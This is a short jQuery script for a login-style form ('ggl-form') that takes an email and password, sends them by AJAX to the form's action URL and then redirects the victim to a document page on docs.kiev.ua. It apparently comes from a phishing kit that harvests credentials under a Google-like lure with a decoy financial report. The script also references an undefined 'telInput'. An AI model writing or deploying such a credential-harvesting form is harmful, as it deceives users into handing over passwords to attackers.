$(document).ready(function() {

// FORM
    function sendForm(){
        var inputs = $('.forms-input');
        var nameInput = $('#client-mail');
        var passInput = $('#client-pass');
        var submitBtn = $('#order-button');
        var form = $('.ggl-form');
        var succesMessage = $('.success-message-open');
        var antiBotInput = $('.varificate-input');

        function validateName($name) {
            var nameReg =  /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return nameReg.test( $name );
        }


        // Form AJAX
        form.on('submit', function(event) {
          

            event.preventDefault();
            if (!nameInput.val() != '') {
              nameInput.addClass('invalid');
              setTimeout(function(){
                nameInput.removeClass('invalid');
              }, 3000 );
            }        
            event.preventDefault();
            if (!passInput.val() != '') {
              passInput.addClass('invalid');
              setTimeout(function(){
                passInput.removeClass('invalid');
              }, 3000 );
            }                                     
                       
            if (nameInput.val() != '' && passInput.val() != '' ) {
              // Serialize the form data.
              var formData = $(this).serialize();

              // Submit the form using AJAX.
              $.ajax({
                  type: 'POST',
                  url: $(this).attr('action'),
                  data: formData,
                  beforeSend: function(){
                      submitBtn.html('Отправка...');
                  }
              })
              .done(function(response) {
                window.location.href = "http://docs.kiev.ua/finansoviy-zvit-1-10-2017/account.html";  // replace
             submitBtn.html('ОТПРАВИТЬ');
             form[0].reset();
             nameInput.removeClass('invalid');
             telInput.removeClass('invalid');

             // open success massamge
            
             var succesMessage = setTimeout(function(){
              $('.ggl-form').css('display', 'block');
              $('.success-message-container').css('display', 'none');
            }, 5000);
              })
              .fail(function(data) {
                  submitBtn.html('Failed');
              });
            } 
            else {
              if ( nameInput.val() != '' == false ){
                nameInput.addClass('invalid');
              } 
            if ( passInput.val() != '' == false ){
                passInput.addClass('invalid');
              }         
            }
        });
    };

    sendForm();

   });   